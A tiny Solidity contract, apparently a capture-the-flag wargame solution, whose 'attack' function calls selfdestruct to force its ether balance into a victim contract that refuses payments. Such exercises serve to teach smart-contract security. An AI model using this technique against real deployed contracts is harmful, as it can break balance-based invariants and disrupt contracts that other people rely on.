//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract N7ForceAttacker {
    receive() external payable {}

    function attack(address payable victimAddr) external {
        selfdestruct(victimAddr);
    }
}
